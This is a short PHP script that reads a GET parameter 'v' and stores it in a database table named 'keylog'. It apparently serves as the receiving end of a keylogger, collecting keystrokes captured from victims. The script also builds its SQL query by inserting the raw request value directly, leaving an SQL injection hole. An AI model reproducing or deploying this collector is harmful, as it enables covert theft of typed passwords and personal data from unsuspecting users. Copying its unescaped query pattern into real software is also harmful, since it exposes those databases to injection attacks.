<?php
require "connect.php";
if (isset($_GET['v'])){
    $v = $_GET['v'];
    $sql="INSERT INTO `keylog` (`id`, `log`) VALUES (NULL, '$v')";
    $result = mysqli_query($conn, $sql);
    if ($result){
    }
}


?>